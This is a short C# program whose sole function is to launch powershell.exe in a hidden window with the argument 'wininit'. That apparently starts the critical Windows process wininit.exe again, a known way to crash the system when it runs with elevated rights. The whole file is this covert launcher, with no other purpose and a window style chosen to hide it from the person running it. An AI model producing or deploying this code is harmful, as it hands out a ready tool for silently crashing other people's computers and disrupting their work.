using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace PowerShell_Wininit {
    public abstract class Program {
        private static void Main() {
            PowerShell_Wininit();
        }

        public static void PowerShell_Wininit() {
            var process = new Process();
            var startInfo = new ProcessStartInfo {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "powershell.exe",
                Arguments = "wininit"
            };
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
